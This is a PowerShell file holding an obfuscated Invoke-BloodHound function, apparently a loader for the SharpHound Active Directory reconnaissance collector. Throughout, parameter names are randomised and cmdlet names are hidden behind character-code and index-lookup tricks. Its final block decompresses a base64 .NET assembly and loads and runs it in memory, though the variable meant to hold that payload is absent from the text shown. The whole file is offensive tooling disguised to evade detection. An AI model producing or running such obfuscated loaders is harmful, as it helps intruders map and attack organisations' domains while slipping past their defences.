 function Invoke-BloodHound
{
    

    [CmdletBinding(PositionalBinding = $false)]
    param(
        [Alias("c")]
        [String[]]
        $b41vWqIVAtKmwkPVl = [String[]]@('Default'),

        [Alias("d")]
        [String]
        $D,
        
        [Alias("s")]
        [Switch]
        $ni,

        [Switch]
        $vsrLqNQ7ZCEOzWowd,

        [String]
        $bsQp7OBLq4i,

        [String]
        $DZz6o1UhyvaExbBlfnVc,

        [String]
        $u8PCzFe9GZY,

        [ValidateScript({ & ([string]::join('', ( (84,101,115,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) -Path $_ })]
        [String]
        $kKexCWuBYC8uSEx5wTlttDk0P = $( & (("b8I-5YLPJF6shxTXegfDEo3O4kUvnHSWymzuRMjcVqrQa7iA2GKNCdB1w0plt9Z")[49,16,60,3,6,21,39,44,60,46,21,28] -join '') ),

        [ValidateNotNullOrEmpty()]
        [String]
        $h439XnCO7DbFWr,

        [String]
        $pC8xMud,

        [Switch]
        $U8Fehp5EAvP,

        [Switch]
        $oeVeWFbywQwfIyWczSvYNe,

        [Switch]
        $snazV52EIuQiJyD7fHr,

        [String]
        $ZipFilenameGypC,
        
        [Switch]
        $6ibbFht,
        
        [String]
        $D3U5c,
        
        [Switch]
        $DJW1hCu,
        
        [Switch]
        $VCRjXIT5tDc2wS9vbL3Mn,

        [String]
        $tSZ1ROHVGw0rWpvq6D,

        [String]
        $M1c6lAngZ,

        [string]
        $xoqaIT3,

        [ValidateRange(0, 65535)]
        [Int]
        $gK0h6WcLGx9Mue8YPylSB,

        [Switch]
        $tbLOIOD1ctA6gVQrFI,
        
        [Switch]
        $1fL,

        [Switch]
        $Ev4AHTg3tUIkWhdD,

        [Switch]
        $AZsvYOt6,

        [ValidateRange(50, 5000)]
        [Int]
        $mWdrzpIBs57XPAf6EHc5B = 500,

        [Switch]
        $VGIblyugDpaYNRzK,

        [Switch]
        $UZBy2pDRMfn9ce46YSqLvKlA,

        [Int]
        $QuV,

        [ValidateRange(0, 100)]
        [Int]
        $xIphtd9aPH,

        [Int]
        $9B2cvYPfXp1ya4n8ETCdL,

        [Switch]
        $j,

        [String]
        $fkm,

        [String]
        $izmZ,

        [Switch]
        $Gfv5ho,

        [Switch]
        $7,

        [String]
        $odQy4w3UaKSfeIYl9t1,

        [String]
        $1bLf3Ra7FRsSMd7O3hGaIY,

        [ValidateRange(500, 60000)]
        [Int]
        $pVjXdeTP0H8Lf6nxrkB3FotcZ,
        
        [Alias("v")]
        [ValidateRange(0, 5)]
        [Int]
        $KynCGDupZGa6myHA6EnLe1W,

        [Alias("h")]
        [Switch]
        $MJmXGBqYL4su7VC,

        [Switch]
        $1HI04ZucPwmo
    )

    $CdjuaHM1 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Collections.Generic.List[System.Object]
    
    if(!($PSBoundParameters.ContainsKey("help") -or $PSBoundParameters.ContainsKey("version"))){
        $PSBoundParameters.Keys | % {
            if ($_ -notmatch "verbosity"){
                $CdjuaHM1.add("--$_")
                if($PSBoundParameters.item($_).gettype().name -notmatch "switch"){
                    $CdjuaHM1.add($PSBoundParameters.item($_))
                }
            }
            elseif ($_ -match "verbosity") {
                $CdjuaHM1.add("-v")
                $CdjuaHM1.add($PSBoundParameters.item($_))
            }
        }
    }
    else {
        $PSBoundParameters.Keys |? {$_ -match "help" -or $_ -match "version"}| % {
            $CdjuaHM1.add("--$_")
        }
    }
    
    $1IfhakBZ = [string[]]$CdjuaHM1.ToArray()

	$PATRwk = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($GM6Q),[IO.Compression.CompressionMode]::Decompress)
	$23g = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Byte[](1046528)
	$PATRwk.Read($23g, 0, 1046528) | & (("WghZy74PlR9TMbv65KOAF0Xq-E2xoCuGnpSmt3szjDaVH8JriYfkBwcd1QLIUNe")[18,30,36,24,61,30,8,8] -join '')
	$FWlSpUdx0SGI9KI = [Reflection.Assembly]::Load($23g)
	$lum8eOG3jt2kNTPpnI = [Reflection.BindingFlags] "Public,Static"
	$ijE7paw3KyZFM = @()
	$FWlSpUdx0SGI9KI.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $lum8eOG3jt2kNTPpnI).Invoke($Null, @())
	$FWlSpUdx0SGI9KI.GetType("Sharphound.Program").GetMethod("InvokeSharpHound").Invoke($Null, @(,$1IfhakBZ))
}
